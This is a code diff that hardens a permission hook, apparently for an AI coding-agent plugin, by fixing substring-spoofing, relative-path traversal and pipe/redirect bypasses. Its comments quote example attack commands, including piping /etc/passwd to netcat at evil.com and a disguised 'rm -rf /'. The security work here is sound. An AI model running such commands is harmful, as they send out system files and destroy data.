@@ -35,6 +35,7 @@ from hook_utils import (
     log_debug,
     output_empty,
     output_permission,
+    parse_bool_env,
     parse_hook_input,
     read_stdin_safe,
 )
@@ -42,8 +43,7 @@ from hook_utils import (
 
 def is_enabled() -> bool:
     """Check if safe permissions auto-approval is enabled."""
-    val = os.environ.get("OMC_SAFE_PERMISSIONS", "1").lower()
-    return val not in ("0", "false", "no", "off")
+    return parse_bool_env("OMC_SAFE_PERMISSIONS", default=True)
 
 # =============================================================================
 # Safe command patterns
@@ -114,6 +114,15 @@ SAFE_PATTERN_NAMES = [
 ]
 
 
+def has_shell_operators(command: str) -> bool:
+    """Check if command contains pipes or redirects that could be dangerous.
+
+    Security fix: prevents auto-approving commands like 'cat /etc/passwd | nc evil.com'.
+    Simple heuristic - looks for unquoted shell operators.
+    """
+    return bool(re.search(r'[|><]|&&', command))
+
+
 def is_plugin_internal_script(command: str) -> bool:
     """
     Check if command runs a script from within the plugin directory.
@@ -131,21 +140,43 @@ def is_plugin_internal_script(command: str) -> bool:
     log_debug(f"CLAUDE_PLUGIN_ROOT='{plugin_root}'")
     log_debug(f"command='{command[:200]}'")
 
-    # Check if the command contains the plugin root path
-    if plugin_root and plugin_root in command:
-        log_debug(f"command references plugin path: {plugin_root}")
-        return True
-
-    # Fallback: check for oh-my-claude skill path pattern (handles cache paths)
-    # This works even when CLAUDE_PLUGIN_ROOT isn't set
-    # Pattern: .claude/plugins/cache/oh-my-claude/oh-my-claude/*/skills/
-    if "oh-my-claude" in command and "/skills/" in command:
-        log_debug("command matches oh-my-claude skill pattern")
-        return True
-
     if not plugin_root:
-        log_debug("CLAUDE_PLUGIN_ROOT not set and no fallback match")
+        log_debug("CLAUDE_PLUGIN_ROOT not set, cannot verify plugin script")
+        return False
 
+    # Security fix: extract the script path from the command by stripping leading
+    # interpreters (python, bash, uv run, etc.) and verify it starts with plugin_root.
+    # Substring containment was spoofable (e.g., "rm -rf / #/path/to/plugin").
+    stripped = command.strip()
+    # Strip common interpreter prefixes to find the actual script path
+    interpreter_prefixes = [
+        r'^uv\s+run\s+(?:--script\s+)?(?:--with\s+\S+\s+)*',
+        r'^python3?\s+(?:-[^\s]+\s+)*',
+        r'^bash\s+(?:-[^\s]+\s+)*',
+        r'^sh\s+(?:-[^\s]+\s+)*',
+    ]
+    script_path = stripped
+    for prefix_pattern in interpreter_prefixes:
+        match = re.match(prefix_pattern, script_path)
+        if match:
+            script_path = script_path[match.end():].strip()
+            break
+
+    # Extract just the first argument (the script path) before any flags/args
+    script_path = script_path.split()[0] if script_path.split() else ""
+
+    # Resolve to absolute and verify it lives under plugin_root
+    if script_path:
+        try:
+            resolved = os.path.realpath(script_path)
+            plugin_resolved = os.path.realpath(plugin_root)
+            if resolved.startswith(plugin_resolved + os.sep) or resolved == plugin_resolved:
+                log_debug(f"command script resolves under plugin root: {resolved}")
+                return True
+        except (OSError, ValueError) as e:
+            log_debug(f"path resolution error for plugin check: {e}")
+
+    log_debug("command does not reference a verified plugin script")
     return False
 
 
@@ -165,10 +196,11 @@ def is_path_in_project(path: str) -> bool:
     cwd = os.getcwd()
     log_debug(f"cwd={cwd}, path={path}")
 
-    # Relative paths are always considered safe (they're relative to cwd)
+    # Security fix: resolve relative paths to absolute before checking.
+    # A relative path like "../../etc/passwd" is not safe just because it's relative.
     if not os.path.isabs(path):
-        log_debug("relative path - safe")
-        return True
+        path = os.path.join(cwd, path)
+        log_debug(f"resolved relative path to: {path}")
 
     # Resolve to absolute and check if within cwd
     try:
@@ -236,6 +268,10 @@ def is_safe_command(command: str) -> tuple[bool, str | None]:
 
     for pattern_name in SAFE_PATTERN_NAMES:
         if SAFE_PATTERNS.match(pattern_name, command):
+            # Security: reject commands with pipes/redirects even if base command is safe
+            if has_shell_operators(command):
+                log_debug(f"command matched {pattern_name} but contains shell operators - deferring")
+                return False, None
             log_debug(f"command matched safe pattern: {pattern_name}")
             return True, pattern_name
     return False, None
